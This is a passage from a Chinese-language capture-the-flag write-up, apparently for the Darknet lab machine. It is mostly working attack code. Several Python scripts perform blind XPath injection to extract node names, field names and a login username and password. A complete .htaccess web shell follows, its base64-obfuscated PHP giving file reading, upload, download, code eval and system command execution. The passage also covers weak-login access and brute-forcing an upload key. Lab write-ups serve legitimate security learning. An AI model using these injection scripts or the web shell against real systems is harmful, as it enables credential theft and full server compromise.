<span class="keyword">if</span> SUCCESS_FLAG <span class="keyword">in</span> r.text:</span><br><span class="line">                    exfil += char</span><br><span class="line">                    write_out(char)</span><br><span class="line">                    found_char = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> exfil</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 实战探测开始 ---</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 正在探测当前节点名称 (name(.)): &quot;</span>)</span><br><span class="line"><span class="comment"># 这里的 name(.) 是指当前 XPath 查询定位到的那个节点</span></span><br><span class="line">current_node = exfiltrate_node_name(<span class="string">&quot;1 and starts-with(name(.),&#x27;&#123;exfil&#125;&#x27;)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[*] 正在探测父节点名称 (name(..)): &quot;</span>)</span><br><span class="line"><span class="comment"># 这里的 name(..) 向上跳一级，帮助我们理解结构</span></span><br><span class="line">parent_node = exfiltrate_node_name(<span class="string">&quot;1 and starts-with(name(..),&#x27;&#123;exfil&#125;&#x27;)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n\n[!] 结构还原完成: //<span class="subst">&#123;parent_node&#125;</span>/<span class="subst">&#123;current_node&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/69b129e3ad79459fdc9e9ce1.png"></p>
+<h4 id="爆破字段属性"><a href="#爆破字段属性" class="headerlink" title="爆破字段属性"></a>爆破字段属性</h4><p>当路径被锁定为 <code>//auth/user</code> 时，接下来的任务是找到除了 <code>email</code> 之外的“价值字段”</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ENTRY_POINT = <span class="string">&#x27;http://signal8.darknet.com/contact.php&#x27;</span></span><br><span class="line">SUCCESS_FLAG = <span class="string">&#x27;errorlevel@darknet.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用敏感字段字典（包含常见的英语和西班牙语关键词）</span></span><br><span class="line"><span class="comment"># 因为我们之前分析过目标可能有西班牙语背景，所以加入 clave</span></span><br><span class="line">WORDLIST = [</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;clave&#x27;</span>, <span class="string">&#x27;pwd&#x27;</span>, <span class="string">&#x27;secret&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;role&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;token&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_attributes</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 开始爆破 //auth/user[1] 下的字段名...&quot;</span>)</span><br><span class="line">    found_attributes = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> WORDLIST:</span><br><span class="line">        <span class="comment"># 构造检测 Payload：探测当前 user 节点下是否存在名为 &#123;word&#125; 的子节点</span></span><br><span class="line">        payload = <span class="string">f&quot;1 and count(//auth/user[1]/<span class="subst">&#123;word&#125;</span>)&gt;0&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(ENTRY_POINT, params=&#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;)</span><br><span class="line">            <span class="keyword">if</span> SUCCESS_FLAG <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] 发现有效字段: <span class="subst">&#123;word&#125;</span>&quot;</span>)</span><br><span class="line">                found_attributes.append(word)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> found_attributes</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    attributes = find_attributes()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[!] 探测完成。当前 user 节点包含字段: <span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(attributes)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/69b12a69ad79459fdc9e9f5f.png"></p>
+<h4 id="爆破字段值"><a href="#爆破字段值" class="headerlink" title="爆破字段值"></a>爆破字段值</h4><p>现在的障碍只剩下最后一道防线：提取它们的具体值（id 只是数字，所以排除）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">ENTRY_POINT = <span class="string">&#x27;http://signal8.darknet.com/contact.php&#x27;</span></span><br><span class="line">SUCCESS_FLAG = <span class="string">&#x27;errorlevel@darknet.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义我们要拖取的字段</span></span><br><span class="line">TARGET_FIELDS = [<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;clave&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_out</span>(<span class="params">char</span>):</span><br><span class="line">    sys.stdout.write(char)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_field_value</span>(<span class="params">field_name</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    针对具体字段进行逐字符提取</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 正在提取字段 [<span class="subst">&#123;field_name&#125;</span>] 的内容: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 扩展字符集，密码可能包含特殊符号</span></span><br><span class="line">    charset = string.ascii_letters + string.digits + <span class="string">&quot;!@#$%^&amp;*()_+=-&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="comment"># 构造 Payload：1 and starts-with(//auth/user[id=1]/字段名, &#x27;当前进度+猜测字符&#x27;)</span></span><br><span class="line">            <span class="comment"># 这里的 id=1 是我们定位目标用户的关键索引</span></span><br><span class="line">            payload = <span class="string">f&quot;1 and starts-with(//auth/user[id=1]/<span class="subst">&#123;field_name&#125;</span>, &#x27;<span class="subst">&#123;value + char&#125;</span>&#x27;)&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.get(ENTRY_POINT, params=&#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">                <span class="keyword">if</span> SUCCESS_FLAG <span class="keyword">in</span> r.text:</span><br><span class="line">                    value += char</span><br><span class="line">                    write_out(char)</span><br><span class="line">                    found_char = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; [Done]&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 开启最终收割模式 ---</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;XPath 注入最终数据提取阶段&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">results = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> field <span class="keyword">in</span> TARGET_FIELDS:</span><br><span class="line">    results[field] = extract_field_value(field)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;成功获取登录凭据：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Username: <span class="subst">&#123;results[<span class="string">&#x27;username&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Password: <span class="subst">&#123;results[<span class="string">&#x27;clave&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/69b12b24ad79459fdc9e9f6d.png"></p>
+<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><h3 id="Secure-Login"><a href="#Secure-Login" class="headerlink" title="Secure Login"></a>Secure Login</h3><p>访问 <code>robots.txt</code> 文件拿到一个敏感路径</p>
+<p><img src="https://pic1.imgdb.cn/item/69b122a4ad79459fdc9e836b.png"></p>
+<p>是一个登录框</p>
+<p><img src="https://pic1.imgdb.cn/item/69b122dbad79459fdc9e8461.png"></p>
+<p>成功进入后台，但是 <code>Editor PHP</code> 功能没用</p>
+<p><img src="https://pic1.imgdb.cn/item/69b12b73ad79459fdc9e9f6f.png"></p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>查看页面源代码发现有个注释文件</p>
+<p><img src="https://pic1.imgdb.cn/item/69b12bbaad79459fdc9e9f74.png"></p>
+<p>访问来到文件上传点</p>
+<p><img src="https://pic1.imgdb.cn/item/69b12c06ad79459fdc9e9f7b.png"></p>
+<p>很快我就发现，必须选中正确的复选框组合才能上传任何内容</p>
+<p>每个复选框都有一个数值，所以我把这些数值复制到一个脚本中，然后尝试所有可能的组合</p>
+<p>如果响应中没有出现西班牙语 “Key <em>incorrecta!”</em> ，我就知道这个组合是正确的</p>
+<p>经过一些手动调整，我还发现密钥由 4 个整数组成</p>
+<p>尝试使用多于或少于 4 个密钥的组合会导致 HTTP 响应出现 “ <em>La longitud de la clave no es la correcta!”</em></p>
+<p>最后爆破出来是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">37, 10, 59, 17</span><br></pre></td></tr></table></figure>
+
+<p>因为在前面有泄露过 Apache 配置信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName signal8.darknet.com</span><br><span class="line">    ServerAdmin errorlevel@darknet.com</span><br><span class="line">    DocumentRoot /home/errorlevel/public_html</span><br><span class="line"></span><br><span class="line">    &lt;Directory /home/errorlevel/public_html&gt;</span><br><span class="line">        Options -Indexes +FollowSymLinks</span><br><span class="line">        AllowOverride All</span><br><span class="line">        Require all granted</span><br><span class="line">    &lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">    ErrorLog /var/log/apache2/signal8_error.log</span><br><span class="line">    CustomLog /var/log/apache2/signal8_access.log combined</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+
+<p>编写含有木马的 <code>.htaccess</code> 文件</p>
+<p>参考 PHP 大码：<a target="_blank" rel="noopener" href="https://gist.github.com/leonjza/8e9d16c84cf70014c4f36d8f95f9836e">https://gist.github.com/leonjza/8e9d16c84cf70014c4f36d8f95f9836e</a></p>
+<p>运行下面的脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pack.py shell.php</span><br></pre></td></tr></table></figure>
+
+<p>下面这段配置的作用是：允许通过 Web 访问文件名以 <code>.ht</code> 开头的文件（如 <code>.htaccess</code>）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ &quot;^\.ht&quot;&gt;</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这行告诉 Apache，将扩展名为 <code>.htaccess</code> 的文件交给 PHP 解析器处理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .htaccess</span><br></pre></td></tr></table></figure>
+
+<p>完整脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># &lt;!--  Self contained .htaccess web shell - Part of the htshell project</span><br><span class="line"># Written by Wireghoul - http://www.justanotherhacker.com</span><br><span class="line"></span><br><span class="line"># Override default deny rule to make .htaccess file accessible over web</span><br><span class="line">&lt;Files ~ &quot;^\.ht&quot;&gt;</span><br><span class="line"># Uncomment the line below for Apache2.4 and newer</span><br><span class="line"># Require all granted</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line"></span><br><span class="line"># Make .htaccess file be interpreted as php file. This occur after apache has interpreted</span><br><span class="line"># the apache directoves from the .htaccess file</span><br><span class="line">AddType application/x-httpd-php .htaccess</span><br><span class="line"></span><br><span class="line">###### SHELL ###### --&gt;&lt;?php eval(base64_decode(&quot;QCRhY3Rpb24gPSAkX1JFUVVFU1RbJ2FjdGlvbiddO0AkcGF0aCA9ICRfUkVRVUVTVFsncGF0aCddO2Z1bmN0aW9uIGZpbGVfcnd4KCRmaWxlKXsgJHBlcm1zID0gc3Vic3RyKHNwcmludGYoJyVvJywgZmlsZXBlcm1zKCRmaWxlKSksIC00KTsgJHJ3eCA9IFsnLS0tJywgJy0teCcsICctdy0nLCAnLXd4JywgJ3ItLScsICdyLXgnLCAncnctJywgJ3J3eCddOyAkdHlwZSA9IGlzX2RpcigkZmlsZSkgPyAnZCcgOiAnLSc7ICRvd25lciA9ICRwZXJtc1sxXTsgJGdyb3VwID0gJHBlcm1zWzJdOyAkcHVibGljID0gJHBlcm1zWzNdOyByZXR1cm4gJHR5cGUgLiAkcnd4WyRvd25lcl0gLiAkcnd4WyRncm91cF0gLiAkcnd4WyRwdWJsaWNdIC4gJyAnIC4gcG9zaXhfZ2V0cHd1aWQoZmlsZW93bmVyKCRmaWxlKSlbJ25hbWUnXTt9ZnVuY3Rpb24gbWVudSgpeyBwcmludCAnPHByZT4nIC4gZ2V0X2N1cnJlbnRfdXNlcigpIC4gJyBAICcgLiBwaHBfdW5hbWUoKSAuIFBIUF9FT0wgLiAnKG1lbnUpIDxhIGhyZWY9JyAuICRfU0VSVkVSWydQSFBfU0VMRiddIC4gJz9hY3Rpb249bHMmcGF0aD0vPmxzPC9hPiB8JyAuICcgPGEgaHJlZj0nIC4gJF9TRVJWRVJbJ1BIUF9TRUxGJ10gLiAnP2FjdGlvbj1jYXQmcGF0aD0vZXRjL3Bhc3N3ZD5jYXQ8L2E+IHwnIC4gJyA8YSBocmVmPScgLiAkX1NFUlZFUlsnUEhQX1NFTEYnXSAuICc/YWN0aW9uPXVwbG9hZD51cGxvYWQ8L2E+IHwnIC4gJyA8YSBocmVmPScgLiAkX1NFUlZFUlsnUEhQX1NFTEYnXSAuICc/YWN0aW9uPXBocGluZm8+cGhwaW5mbzwvYT4gfCcgLiAnIDxhIGhyZWY9JyAuICRfU0VSVkVSWydQSFBfU0VMRiddIC4gJz9hY3Rpb249aW5mbz5pbmZvPC9hPiB8JyAuICcgPGEgaHJlZj0nIC4gJF9TRVJWRVJbJ1BIUF9TRUxGJ10gLiAnP2FjdGlvbj1ldmFsJnNyYz1wcmludCtwaHBfdW5hbWUlMjglMjklM0I+ZXZhbDwvYT4gfCcgLiAnIDxhIGhyZWY9JyAuICRfU0VSVkVSWydQSFBfU0VMRiddIC4gJz9hY3Rpb249ZXhlYyZjbWQ9aWQ+ZXhlYzwvYT4nIC4gJzwvcHJlPic7fXN3aXRjaCAoJGFjdGlvbikgeyBjYXNlICdscyc6ICRwYXRoID0gJF9HRVRbJ3BhdGgnXTsgJGZpbGVzID0gYXJyYXlfZGlmZihzY2FuZGlyKCRwYXRoKSwgWycuJywgJy4uJ10pOyBtZW51KCk7IGZvcmVhY2ggKCRmaWxlcyBhcyAkZmlsZSkgeyAkbG9jYXRpb24gPSAkcGF0aCAuICRmaWxlOyBpZiAoaXNfZGlyKCRsb2NhdGlvbikpIHsgJHVybF9hY3Rpb24gPSAnbHMnOyAkbG9jYXRpb24gPSBydHJpbSgkbG9jYXRpb24sICcvJykgLiAnLyc7IH0gZWxzZSB7ICR1cmxfYWN0aW9uID0gJ2NhdCc7IH0gJHdyaXRhYmxlID0gaXNfd3JpdGFibGUoJGxvY2F0aW9uKSA/ICdncmVlbicgOiAncmVkJzsgJHJlYWRhYmxlID0gaXNfcmVhZGFibGUoJGxvY2F0aW9uKSA/ICdncmVlbicgOiAncmVkJzsgaWYgKCRyZWFkYWJsZSA9PSAnZ3JlZW4nIGFuZCAhaXNfZGlyKCRsb2NhdGlvbikpICRkb3dubG9hZCA9ICc8YSBocmVmPScgLiAkX1NFUlZFUlsnUEhQX1NFTEYnXSAuICc/YWN0aW9uPWRvd25sb2FkJnBhdGg9JyAuIHVybGVuY29kZSgkbG9jYXRpb24pIC4gJz5Eb3dubG9hZDwvYT48L3NwYW4+JzsgZWxzZSAkZG93bmxvYWQgPSAnRG93bmxvYWQnOyBwcmludCAnPHByZT4nOyBwcmludCAnPHNwYW4gc3R5bGU9XCdjb2xvcjonIC4gJHdyaXRhYmxlIC4gJ1wnPldyaXRlPC9zcGFuPiAnIC4gJzxzcGFuIHN0eWxlPVwnY29sb3I6JyAuICRyZWFkYWJsZSAuICdcJz5SZWFkPC9zcGFuPiB8ICcgLiAkZG93bmxvYWQgLiAnIHwgJyAuIGZpbGVfcnd4KCRsb2NhdGlvbikgLiAnIHwgJyAuIGRhdGUoJ00gZCBZIEg6aTpzJywgZmlsZWN0aW1lKCRsb2NhdGlvbikpIC4gJyA8YSBocmVmPScgLiAkX1NFUlZFUlsnUEhQX1NFTEYnXSAuICc/YWN0aW9uPScgLiAkdXJsX2FjdGlvbiAuICcmcGF0aD0nIC4gdXJsZW5jb2RlKCRsb2NhdGlvbikgLiAnPicgLiAkbG9jYXRpb24gLiAnPC9hPic7IHByaW50ICc8L3ByZT4nOyB9IHJldHVybjsgY2FzZSAnY2F0JzogJGZpbGUgPSBmaWxlX2dldF9jb250ZW50cygkcGF0aCk7IG1lbnUoKTsgcHJpbnQgJzxwcmU+JyAuICRmaWxlIC4gJzwvcHJlPic7IHJldHVybjsgY2FzZSAndXBsb2FkJzogQCRmaWxlID0gJF9GSUxFU1snZmlsZSddOyAkbWVzc2FnZSA9IG51bGw7IGlmICgkZmlsZSkgeyBtb3ZlX3VwbG9hZGVkX2ZpbGUoJGZpbGVbJ3RtcF9uYW1lJ10sICRwYXRoKTsgJG1lc3NhZ2UgPSAnVXBsb2FkZWQgZmlsZSB0bzogPGEgaHJlZj0nIC4gJF9TRVJWRVJbJ1BIUF9TRUxGJ10gLiAnP2FjdGlvbj0nIC4gJ2NhdCZwYXRoPScgLiB1cmxlbmNvZGUoJHBhdGgpIC4gJz4nIC4gJHBhdGggLiAnPC9hPic7IH0gbWVudSgpOyBwcmludCAnPGZvcm0gYWN0aW9uPSInIC4gJF9TRVJWRVJbJ1BIUF9TRUxGJ10gLiAnP2FjdGlvbj11cGxvYWQiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+ICcgLiAnPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPicgLiAnRnVsbCBEZXN0aW5hdGlvbiBQYXRoICYgRmlsZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBhdGgiPicgLiAnPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlVwbG9hZCI+PC9mb3JtPic7IHByaW50ICRtZXNzYWdlOyByZXR1cm47IGNhc2UgJ2Rvd25sb2FkJzogaGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScpOyBoZWFkZXIoJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2Rpbmc6IEJpbmFyeScpOyBoZWFkZXIoJ0NvbnRlbnQtZGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSInIC4gYmFzZW5hbWUoJHBhdGgpIC4gJyInKTsgZWNobyByZWFkZmlsZSgkcGF0aCk7IHJldHVybjsgY2FzZSAncGhwaW5mbyc6IG1lbnUoKTsgcGhwaW5mbygpOyByZXR1cm47IGNhc2UgJ2luZm8nOiBtZW51KCk7IHByaW50ICc8cHJlPic7IHByaW50ICdFbnZpcm9ubWVudCcgLiBQSFBfRU9MOyBwcmludCAnQ3VycmVudCBVc2VyOiAnIC4gZ2V0X2N1cnJlbnRfdXNlcigpIC4gUEhQX0VPTDsgcHJpbnQgJ1BIUCBWZXJzaW9uOiAnIC4gcGhwdmVyc2lvbigpIC4gUEhQX0VPTDsgcHJpbnQgJ0xvYWRlZCBDb25maWc6ICcgLiBwaHBfaW5pX2xvYWRlZF9maWxlKCkgLiBQSFBfRU9MOyBwcmludCAnUEhQIFNBUEk6ICcgLiBwaHBfc2FwaV9uYW1lKCkgLiBQSFBfRU9MOyBwcmludCAnVW5hbWU6ICcgLiBwaHBfdW5hbWUoKSAuIFBIUF9FT0w7IHByaW50ICcnIC4gUEhQX0VPTDsgcHJpbnQgJ0NvbmZpZ3VyYXRpb24nIC4gUEhQX0VPTDsgcHJpbnQgJ09wZW4gQmFzZWRpcjogJyAuIGluaV9nZXQoJ29wZW5fYmFzZWRpcicpIC4gUEhQX0VPTDsgcHJpbnQgJ0Rpc2FibGUgQ2xhc3NlczogJyAuIGluaV9nZXQoJ2Rpc2FibGVfY2xhc3NlcycpIC4gUEhQX0VPTDsgcHJpbnQgJ0Rpc2FibGUgRnVuY3Rpb25zOiAnIC4gaW5pX2dldCgnZGlzYWJsZV9mdW5jdGlvbnMnKSAuIFBIUF9FT0w7IHByaW50ICdVUkwgZm9wZW46ICcgLiBpbmlfZ2V0KCdhbGxvd191cmxfZm9wZW4nKSAuIFBIUF9FT0w7IHByaW50ICdVUkwgSW5jbHVkZTogJyAuIGluaV9nZXQoJ2FsbG93X3VybF9pbmNsdWRlJykgLiBQSFBfRU9MOyBwcmludCAnRmlsZSBVcGxvYWRzOiAnIC4gaW5pX2dldCgnZmlsZV91cGxvYWRzJykgLiBQSFBfRU9MOyBwcmludCAnPC9wcmU+JzsgcmV0dXJuOyBjYXNlICdldmFsJzogQCRzcmMgPSAkX1JFUVVFU1RbJ3NyYyddOyBtZW51KCk7IHByaW50ICc8Zm9ybSBhY3Rpb249IicgLiAkX1NFUlZFUlsnUEhQX1NFTEYnXSAuICc/YWN0aW9uPWV2YWwiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+ICcgLiAnUEhQIENvZGU6IDxicj48dGV4dGFyZWEgbmFtZT0ic3JjIiByb3dzPSIxMCIgY29scz0iNzAiPicgLiAkc3JjIC4gJzwvdGV4dGFyZWE+PGJyPicgLiAnPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkV2YWx1YXRlIFBIUCI+PC9mb3JtPic7IGlmICghZW1wdHkoJHNyYykpIHsgcHJpbnQgJzxwcmU+RXZhbCBPdXRwdXQ6PGJyPic7IGV2YWwoJHNyYyk7IHByaW50ICc8L3ByZT4nOyB9IHJldHVybjsgY2FzZSAnZXhlYyc6IEAkY21kID0gJF9SRVFVRVNUWydjbWQnXTsgbWVudSgpOyBwcmludCAnPGZvcm0gYWN0aW9uPSInIC4gJF9TRVJWRVJbJ1BIUF9TRUxGJ10gLiAnP2FjdGlvbj1leGVjIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPiAnIC4gJ1N5c3RlbSBDb21tYW5kOiA8YnI+PHRleHRhcmVhIG5hbWU9ImNtZCIgcm93cz0iMTAiIGNvbHM9IjcwIj4nIC4gJGNtZCAuICc8L3RleHRhcmVhPjxicj4nIC4gJzxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJSdW4iPjwvZm9ybT4nOyBpZiAoIWVtcHR5KCRjbWQpKSB7IHByaW50ICc8cHJlPkNvbW1hbmQgT3V0cHV0Ojxicj4nOyBpZiAoY2xhc3NfZXhpc3RzKCdSZWZsZWN0aW9uRnVuY3Rpb24nKSkgeyAkZnVuY3Rpb24gPSBuZXcgUmVmbGVjdGlvbkZ1bmN0aW9uKCdzeXN0ZW0nKTsgJGZ1bmN0aW9uLT5pbnZva2UoJGNtZCk7IH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ2NhbGxfdXNlcl9mdW5jX2FycmF5JykpIHsgY2FsbF91c2VyX2Z1bmNfYXJyYXkoJ3N5c3RlbScsIFskY21kXSk7IH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ2NhbGxfdXNlcl9mdW5jJykpIHsgY2FsbF91c2VyX2Z1bmMoJ3N5c3RlbScsICRjbWQpOyB9IGVsc2UgeyBzeXN0ZW0oJGNtZCk7IH0gcHJpbnQgJzwvcHJlPic7IH0gcmV0dXJuOyBkZWZhdWx0OiBtZW51KCk7IHJldHVybjt9&quot;));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/69b13b0ead79459fdc9ee47a.png"></p>
